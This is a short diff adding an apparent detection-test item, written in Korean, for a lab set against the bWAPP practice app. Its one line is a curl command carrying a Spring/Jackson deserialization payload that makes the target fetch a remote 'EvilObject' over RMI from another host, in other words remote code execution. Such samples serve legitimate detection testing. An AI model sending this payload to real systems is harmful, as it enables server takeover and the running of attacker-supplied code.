@@ -1,0 +1,2 @@
+## 탐지 항목 ##
+curl -k --resolve curl.ncurity.com:80:192.168.41.52 -X POST "http://curl.ncurity.com/bWAPP/login.php" -d "'{id:133,object:[org.springframework.beans.factory.config.PropertyPathFactoryBean,{targetBeanName:rmi://172.20.10.5:8080/EvilObject,propertyPath:foo,beanFactory:[org.springframework.jndi.support.SimpleJndiBeanFactory,{shareableResources:[rmi://172.20.10.5:8080/EvilObject]}]}]}'"
